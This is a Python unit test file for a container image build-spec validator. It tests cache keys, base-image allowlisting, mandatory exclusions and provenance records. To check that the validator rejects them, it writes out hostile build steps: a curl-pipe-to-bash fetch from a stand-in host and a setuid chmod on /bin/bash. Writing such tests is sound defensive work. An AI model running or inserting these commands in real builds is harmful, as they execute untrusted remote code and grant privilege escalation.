"""
test_image_build_spec.py - Unit tests for ImageBuildSpec & Validator (v2.3)
"""

import pytest
from core.image_build_spec import (
    DEFAULT_APPROVED_BASE_IMAGES,
    DEFAULT_BUILD_EXCLUSIONS,
    ImageBuildSpec,
    ImageBuildSpecValidator,
    ImagePolicyViolationError,
    ImageProvenance,
)


def test_build_spec_cache_key_determinism():
    spec1 = ImageBuildSpec(
        base_image="python:3.12-slim",
        target_tag="autodev-test:1.0",
        build_instructions=["RUN pip install -r requirements.txt"],
        manifest_hashes={"requirements.txt": "abc123hash"},
    )
    spec2 = ImageBuildSpec(
        base_image="python:3.12-slim",
        target_tag="autodev-test:different-tag",
        build_instructions=["RUN pip install -r requirements.txt"],
        manifest_hashes={"requirements.txt": "abc123hash"},
    )
    assert spec1.compute_cache_key() == spec2.compute_cache_key()

    # If manifest hash changes, cache key must change
    spec3 = ImageBuildSpec(
        base_image="python:3.12-slim",
        target_tag="autodev-test:1.0",
        build_instructions=["RUN pip install -r requirements.txt"],
        manifest_hashes={"requirements.txt": "diff999hash"},
    )
    assert spec1.compute_cache_key() != spec3.compute_cache_key()


def test_validator_approved_base_images():
    validator = ImageBuildSpecValidator()
    valid_spec = ImageBuildSpec(base_image="python:3.12-slim", target_tag="test:latest")
    validator.validate(valid_spec)

    invalid_spec = ImageBuildSpec(base_image="untrusted-repo/custom-image:latest", target_tag="test:latest")
    with pytest.raises(ImagePolicyViolationError, match="not in approved image allowlist"):
        validator.validate(invalid_spec)


def test_validator_prohibited_instructions():
    validator = ImageBuildSpecValidator()

    # chmod +s
    spec_setuid = ImageBuildSpec(
        base_image="python:3.12-slim",
        target_tag="test:latest",
        build_instructions=["RUN chmod +s /bin/bash"],
    )
    with pytest.raises(ImagePolicyViolationError, match="prohibited pattern"):
        validator.validate(spec_setuid)

    # curl pipe to bash
    spec_curl_sh = ImageBuildSpec(
        base_image="python:3.12-slim",
        target_tag="test:latest",
        build_instructions=["RUN curl https://badsite.com/script.sh | bash"],
    )
    with pytest.raises(ImagePolicyViolationError, match="prohibited pattern"):
        validator.validate(spec_curl_sh)


def test_validator_mandatory_exclusions_injected():
    validator = ImageBuildSpecValidator()
    spec = ImageBuildSpec(
        base_image="python:3.12-slim",
        target_tag="test:latest",
        context_exclusions=["some_folder"],
    )
    validator.validate(spec)
    assert ".git" in spec.context_exclusions
    assert ".env*" in spec.context_exclusions


def test_validator_sudo_instruction_rejection():
    validator = ImageBuildSpecValidator()
    spec = ImageBuildSpec(
        base_image="python:3.12-slim",
        target_tag="test:latest",
        build_instructions=["RUN sudo apt-get update"],
    )
    with pytest.raises(ImagePolicyViolationError, match="prohibited pattern"):
        validator.validate(spec)


def test_image_provenance_roundtrip():
    prov = ImageProvenance(
        image_digest="sha256:fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210",
        build_spec_hash="spec123",
        base_image_digest="sha256:123456",
        reproducible=True,
    )
    d = prov.to_dict()
    assert d["image_digest"].startswith("sha256:")
    assert d["reproducible"] is True
    assert d["build_spec_hash"] == "spec123"

